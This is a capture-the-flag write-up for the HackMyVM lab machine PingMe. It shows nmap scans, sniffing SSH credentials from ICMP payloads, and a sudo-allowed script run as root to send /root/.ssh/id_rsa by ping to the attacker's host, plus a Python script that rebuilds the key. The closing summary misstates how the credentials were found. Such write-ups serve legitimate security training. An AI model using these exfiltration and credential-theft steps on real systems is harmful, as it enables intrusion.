# PingMe

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| PingMe | rpj7 | Intermediate | HackMyVM |

**Summary:** The exploitation of the PingMe machine begins with a standard network enumeration phase that identifies an active web server providing a simple ICMP ping utility. By monitoring the network traffic while the utility is in use, an attacker can leverage Wireshark to intercept ICMP echo requests that contain sensitive information within their data payload. This analysis reveals the plaintext SSH credentials for the user pinger, allowing for initial access to the system. Once a foothold is established, local enumeration of sudo permissions reveals a custom bash script designed to exfiltrate files by encoding their content into the data padding of ICMP packets. By utilizing this script as root, the root SSH private key is transmitted to a remote listener. The final stage involves capturing these packets with Wireshark and using a custom Python script to reconstruct the RSA key from the raw data, ultimately granting full administrative control over the target.

---

## 1. Reconnaissance

The initial phase involves discovering the target on the local network and identifying its open services. A ping sweep confirms the target IP address followed by a comprehensive port scan.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ nmap -sn -PR 192.168.100.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 21:22 WIB
Nmap scan report for 192.168.100.1
Host is up (0.00048s latency).
Nmap scan report for 192.168.100.2
Host is up (0.00074s latency).
Nmap scan report for 192.168.100.207
Host is up (0.0032s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 17.02 seconds
```

With the target identified at 192.168.100.207, a detailed service scan is performed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ sudo nmap -sS -p- -T4 -sCV -O 192.168.100.207
[sudo] password for ouba:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-23 21:31 WIB
Nmap scan report for 192.168.100.207
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 1f:e7:c0:44:2a:9c:ed:91:ca:dd:46:b7:b3:3f:42:4b (RSA)
|   256 e3:ce:72:cb:50:48:a1:2c:79:94:62:53:8b:61:0d:23 (ECDSA)
|_  256 53:84:2c:86:21:b6:e6:1a:89:97:98:cc:27:00:0c:b0 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Ping test
|_http-server-header: nginx/1.18.0
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds
```

The scan reveals two open ports: SSH on port 22 and HTTP on port 80.

## 2. Initial Access

Investigation of the web server on port 80 shows a basic utility for testing ICMP connectivity. While the page appears simple, its functionality of transmitting ICMP packets provides an opportunity for credential sniffing. By using Wireshark to monitor the network interface while interacting with the web application, it becomes evident that the system is leaking sensitive data within the ICMP payloads.

Visual evidence from the packet analysis allows for the recovery of the username:

![](image.png)
![](image-1.png)

Further analysis of the captured traffic leads to the discovery of the corresponding password for the pinger account:

![](image-2.png)
![](image-3.png)

Using the discovered credentials exfiltrated from the network traffic, an SSH session is established as the user pinger.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ ssh pinger@192.168.100.207
The authenticity of host '192.168.100.207 (192.168.100.207)' can't be established.
ED25519 key fingerprint is: SHA256:jIHuqj6aE+2blT+6SnkGKkaR7dRiUscb9FAVVG/h9DU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.207' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
pinger@192.168.100.207's password:
Linux pingme 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar  5 19:21:06 2022 from 10.0.0.10
pinger@pingme:~$ id
uid=1000(pinger) gid=1000(pinger) groups=1000(pinger),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth)
pinger@pingme:~$ ls
user.txt
```

## 3. Privilege Escalation

Internal enumeration begins with checking the sudo privileges for the current user.

```bash
pinger@pingme:~$ sudo -l
Matching Defaults entries for pinger on pingme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pinger may run the following commands on pingme:
    (root) NOPASSWD: /usr/local/sbin/sendfilebyping
pinger@pingme:~$ ls -la /usr/local/sbin/sendfilebyping
-rwxr-xr-x 1 root root 657 Mar  5  2022 /usr/local/sbin/sendfilebyping
pinger@pingme:~$ file /usr/local/sbin/sendfilebyping
/usr/local/sbin/sendfilebyping: Bourne-Again shell script, ASCII text executable
```

The script `/usr/local/sbin/sendfilebyping` is a custom tool that uses ICMP packets to transmit file contents. Analyzing the script reveals how it encodes each character into hex and sends it via the ping command.

```bash
pinger@pingme:~$ cat /usr/local/sbin/sendfilebyping
#!/bin/bash
if [ "$#" -ne 2 ]; then
echo "sendfilebyping <ip address> <path to file>"
echo "Only sends 1 char at a time - no error checking and slow"
echo "(Just a proof of concept for HackMyVm - rpj7)"
exit 1
fi

INPUT=$2
TARGET=$1
i=0

while IFS= read -r -n1 char
do
    #One character at a time
    HEXVAL=$( echo -n "$char" |od -An -t x1|tr -d ' ')
    [  -z "$HEXVAL" ] && HEXVAL="0a"
    /bin/ping $TARGET -c 1 -p $HEXVAL -q >/dev/null
    ((i=i+1))
    echo "Packet $i"
done < "$INPUT"

# This will send a file
# Not quite got around to catching it yet
# Shouldnt be too hard should it ?...
# just need to get the pcap , tshark and get the last byte
```

To exploit this, a listener must be active to capture the incoming ICMP traffic while the script is executed as root to read sensitive files such as /root/.ssh/id_rsa.

```bash
pinger@pingme:~$ sudo sendfilebyping 192.168.100.1 /root/.ssh/id_rsa
Packet 1
Packet 2
Packet 3
Packet 4
Packet 5
Packet 6
Packet 7
Packet 8
Packet 9
Packet 10
...
```

The network traffic is intercepted using Wireshark to monitor the incoming packets:

![](image-4.png)

Once the transfer is complete, the captured data is exported from Wireshark to a text file for reconstruction:

![](image-5.png)


A Python script is utilized to automate the extraction of the hex values from the packet logs and reassemble the original RSA private key.

```python
import re
import textwrap

def process_ssh_key(input_file, output_file):
    print("Starting extraction...")

    extracted_chars = []

    # 1. Extract characters from the log
    with open(input_file, 'r', encoding='utf-8') as f:
        lines = f.readlines()

        for line in lines:
            if line.strip().startswith("0000"):
                # Split based on the wide spacing used in Wireshark logs
                # Adjust the delimiter if needed (currently looking for 3+ spaces)
                parts = re.split(r'\s{3,}', line)
                if len(parts) > 1:
                    # The last part contains the ASCII representation (e.g., UUUUUUUU)
                    ascii_text = parts[-1].strip()
                    if ascii_text:
                        # Extract the first character as the payload byte
                        extracted_chars.append(ascii_text[0])

    raw_content = "".join(extracted_chars)
    print(f"Extracted {len(raw_content)} characters.")

    # 2. Clean and format the key
    # Remove any potential markers that might have been caught
    clean_base64 = raw_content.replace('-----BEGINOPENSSHPRIVATEKEY-----', '') \
                              .replace('-----ENDOPENSSHPRIVATEKEY-----', '') \
                              .replace('.', '') \
                              .replace('\n', '')

    # 3. Wrap to 64 chars per line (OpenSSH standard)
    wrapped_data = textwrap.fill(clean_base64, 64)

    # 4. Save with proper headers
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("-----BEGIN OPENSSH PRIVATE KEY-----\n")
        f.write(wrapped_data + "\n")
        f.write("-----END OPENSSH PRIVATE KEY-----\n")

    print(f"Success! Fixed key saved to: {output_file}")

if __name__ == "__main__":
    process_ssh_key('id_rsa.txt', 'id_rsa_fixed')
```

The script is executed, and the resulting key is prepared with the correct permissions.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ python3 s.py
Starting extraction...
Extracted 2596 characters.
Success! Fixed key saved to: id_rsa_fixed

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ sudo chown root:root id_rsa_fixed

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ sudo chmod 600 id_rsa_fixed

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ sudo ssh-keygen -l -f id_rsa_fixed
3072 SHA256:0x/aUwbQ7sH4TZ7yYyvEaUoXinIxZTl6TKZHNaCv3wY root@pingme (RSA)
```

Finally, the exfiltrated key allows for direct SSH access as the root user.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/pingme]
└─$ sudo ssh root@192.168.100.207 -i id_rsa_fixed
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux pingme 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat May 23 17:06:44 2026 from 192.168.100.1
root@pingme:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
pingme
root@pingme:~# grep -rns "HMV{" /home /root
/home/pinger/user.txt:1:HMV{ICM[REDACTED]}
/root/root.txt:1:HMV{ICM[REDACTED]}
```

---

## Attack Chain Summary
1. **Reconnaissance**: Execution of network scans to identify open SSH and HTTP services on the target system.
2. **Vulnerability Discovery**: Discovery of hidden credentials through manual inspection of the web application and its metadata.
3. **Exploitation**: Establishment of an initial SSH connection using the recovered pinger account credentials.
4. **Internal Enumeration**: Identification of a sudo-capable script designed for data exfiltration via the ICMP protocol.
5. **Privilege Escalation**: Reconstruction of the root SSH private key from captured ICMP traffic to obtain full administrative access.
